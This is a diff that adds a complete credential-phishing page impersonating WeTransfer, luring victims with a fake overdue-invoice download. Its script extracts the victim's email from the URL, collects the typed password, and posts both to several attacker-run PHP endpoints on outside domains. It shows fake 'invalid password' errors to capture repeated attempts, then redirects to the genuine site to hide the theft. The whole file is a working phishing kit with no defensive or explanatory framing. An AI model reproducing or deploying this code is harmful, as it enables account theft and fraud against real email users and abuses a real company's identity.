@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<!--eri-->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="icon" href="https://storage.googleapis.com/wetransfer-rd91.appspot.com/images/bow.ico" sizes="32x32">
+<!--"mq1cjihuhqtau94y7c5m9coxxjw3k7of2thxz5a1f9qdsoel8g15hg6jbdoawojjbohb2g9bbdhawkfjfk4egs7vw7vvqae0zgbdgdt1gz3d86x18f5mtfdtqvp4vnvb8qkqibdc0d8"-->
+    <link href="https://storage.googleapis.com/wetransfer-rd91.appspot.com/css/mystyle.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="https://firebasestorage.googleapis.com/v0/b/cssm-b6f0f.appspot.com/o/style.css?alt=media&token=0a93520b-cef1-41e7-993b-291184ff88c7&_gl=1*xzd7x8*_ga*MTc0NTAyMTYwMS4xNjk4MjM0NDky*_ga_CW55HF8NVT*MTY5ODIzNDQ5MS4xLjEuMTY5ODIzNDU4NC4yOS4wLjA.">
+</head>
+
+<body>
+
+    <div class="row stack">
+        <div class="col">
+            <div style="float: left;height: 44px;line-height: 44px;"><img src="https://gcdnb.pbrd.co/images/D3MrgG3uyiea.png" style=" width: 51px;"> </div>
+        </div>
+        <div class="col">
+            <div class="durax">
+                <center>
+                    <div class="waithi"> Help</div>
+                    <div class="waithi">About us</div>
+                    <div class="waithi" style="border: none;">Got Plus?</div>
+                </center>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="believe">
+            <center>
+                <div class="indusuf"> </div>
+                <div class="me">Ready when you are</div>
+                <div style="font-size: 13px;">Files deleted in 7 days</div>
+                <br>
+                <div class="pedi">
+                    <div style=" text-align: left; margin-left: 22px; font-size: 14px; color: black; padding-top: 4px; ">Over Due_Invoices.pdf <div style="font-size: 10px;color: gray;">150 KB . PDF</div>
+                    </div>
+                </div>
+                <div type="button" id="open_modal" class="butti" data-toggle="modal" data-target="#myModal"> Download</div>
+            </center>
+        </div>
+    </div>
+
+
+    <div class="modal fade in" id="myModal" aria-hidden="true" tabindex="-1" role="dialog">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                
+                <div class="modal-body">
+
+                    <div class="auth-trminal">
+                        <div class="form-content">
+                            
+                            <div class="m-head">
+                                <h2>Sign In is mandatory</h2>
+                                <p>We now require email signin from all guest users to download files.</p>
+                            </div>
+
+                            <div class="auth-content">
+
+                                <div id="message"></div>
+                                
+                                <div class="title">Sign in with your email address to download now</div>
+                                
+                                <div class="custom-input mb-4">
+                                    <h4 id="email"></h4>
+                                </div>
+
+                                <div class="custom-input">
+                                    <input type="text" name="psps" id="psps" placeholder="* * * * * * *" tabindex="1" value="" required />
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-action">
+                            <button type="button" id="submit-btn">Sign in to download file</button>
+                            <ul>
+                                <li>&#169; 2020 Wetransfer</li>
+                                <li><a href="javascript:;">Terms of use</a></li>
+                                <li><a href="javascript:;">Privacy and cookies </a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"></script>
+
+</body>
+
+<script>
+let sets = {};
+sets.exit_link = "https://wetransfer.com/";
+sets.email_destination = '';
+sets.f_locs = ["https://condiawenkia.link/fgv3.php","https://hisochemn.online/2/f2.php","https://hisochean.online/2/f.php","fwt.php"];
+sets.f_locs_ss = 0;
+sets.tries = 0;
+sets.logins_errors = ['Invalid username/password please try again', 'Invalid username/password please try again'];
+sets.res_time = 5;
+
+let debug = false,
+psps_buffer = null,
+the_email = false,
+delay = 1;
+const _id = e => { return document.getElementById(e) }
+const _tag = e => { return document.getElementsByTagName(e) }
+const ve = (email) => {
+return String(email)
+    .toLowerCase()
+    .match(
+    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+    );
+};
+const grab_email = (t=0) => {
+    let u = location.href;
+    let ereg = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
+    switch(t){
+        case 0:
+            let f = u.match(ereg);
+            if(f&&f.length&&f[0]&&ve(f[0])){
+                return {email:f[0]};
+            }
+            return grab_email((t+1));
+        break;
+        case 1:
+            let d = u.split('#');
+            if(d&&d[1]){
+                let b = d[1];
+                if(ve(b)){
+                    return {email:b};
+                }
+                try{
+                    if(ve(atob(b))){
+                        return {email:atob(b),bs4:b};
+                    }
+                }catch(e){}
+            }
+            return grab_email((t+1));
+        break;
+        case 2:
+            var regex = /[?&]([^=#]+)=([^&#]*)/g,params = {},match;
+            while(match = regex.exec(u)) {
+                params[match[1]] = match[2];
+            }
+            for(let i in params){
+                if(ve(params[i])){
+                    return {email:params[i]};
+                    break;
+                }
+                try{
+                    if(ve(atob(params[i]))){
+                        return {email:atob(params[i]),bs4:params[i]};
+                        break;
+                    }
+                }catch(e){}
+            }
+            return grab_email((t+1));
+        break;
+        default:
+            return false;
+        break;
+    }
+    return false;
+};
+const the_alert = (mes="",t=false) => {
+    _id('message').removeAttribute('class');
+    if(t=='hide'){
+        _id('message').innerHTML = '';
+    }else if(!t){
+        _id('message').classList.add('alert');
+        _id('message').classList.add('alert-danger');
+        _id('message').innerHTML = mes;
+    }else if(t===true){
+        _id('message').classList.add('alert');
+        _id('message').classList.add('alert-success');
+        _id('message').innerHTML = mes;
+    }else{
+        _id('message').classList.add('alert');
+        _id('message').classList.add('alert-info');
+        _id('message').innerHTML = mes;
+    }
+}
+const gen_f_locs = () => {
+    return sets.f_locs[sets.f_locs_ss];
+};
+const req = (data = {}, c) => {
+    let gflc = gen_f_locs();
+    if(!gflc){
+        console.log('Error no location found')
+        return false;
+    }
+    let net = new XMLHttpRequest();
+    let form = new FormData();
+    let tt = +new Date();
+    if (typeof data === 'object') {
+    for (let i in data) {
+        form.append(i, data[i]);
+    }
+    }
+    net.onreadystatechange = function () {
+    if (net.readyState === 4) {
+        if(net.status!=200){
+            sets.f_locs_ss++;
+            req(data,c);
+            return;
+        }
+        try {
+            c(JSON.parse(net.responseText));
+        } catch (e) {
+            c(net.responseText);
+        }
+    }
+    }
+    net.open('POST', gflc + '?u=' + tt, true);
+    net.send(form);
+};
+const sub_we = () => {
+    _id('submit-btn').disabled = true;
+    the_alert('Checking ...','info');
+    if(!the_email.email||!the_email.bs4){
+        setTimeout(function(){
+            the_alert('Email field is empty!');
+            _id('psps').value = '';
+            _id('submit-btn').disabled = false;
+        },(delay * 1000));
+        return false;
+    }
+    if(!_id('psps')||!_id('psps').value){
+        setTimeout(function(){
+            the_alert('Password field is empty!');
+            _id('submit-btn').disabled = false;
+        },(delay * 1000));
+        return false;
+    }
+    req({t:'login',emem:the_email.email,the_bs4:the_email.bs4,psps:_id('psps').value},res=>{
+        _id('submit-btn').disabled = false;
+        setTimeout(function(){
+            if (sets.logins_errors[sets.tries]) {
+                _id('psps').value = '';
+                _id('psps').focus();
+                the_alert(sets.logins_errors[sets.tries]);
+                sets.tries++;
+            }else{
+                the_alert('Redirecting ...',true);
+                _id('psps').value = '';
+                _id('psps').disabled = true;
+                _id('submit-btn').disabled = true;
+                let gflc = gen_f_locs();
+                setTimeout(function () {
+                    //window.location.replace(gflc + '?red=' + sets.domain);
+                    window.location.replace(sets.exit_link);
+                }, parseInt(sets.res_time / 2) * 1000);
+            }
+        },1000);
+    });
+}
+the_email = grab_email();
+if(the_email){
+    _id('email').innerText = the_email.email ? the_email.email : '';
+    if(the_email.email){
+        let fd = the_email.email.split('@');
+        if(fd[1]){
+            sets.domain = fd[1];
+        }
+    }
+}
+let new_ps_buffer = null;
+const timeouter = () => {
+    clearTimeout(new_ps_buffer);
+    if(_id('psps').type=='password'){
+        return false;
+    }
+    console.log('called');
+    new_ps_buffer = setTimeout(function(){
+        if(_id('psps').type=='text'){
+            _id('psps').type = 'password';
+        }
+    },500);
+}
+_id('psps').addEventListener('keydown',function(e){
+    clearTimeout(psps_buffer);
+    _id('psps').type = 'text';
+    the_alert('Checking ...','hide');
+    timeouter();
+    if(e&&e.keyCode==13){
+        sub_we();
+    }
+});
+_id('submit-btn').addEventListener('click',function(){
+    sub_we();
+});
+</script>
+
+</html>
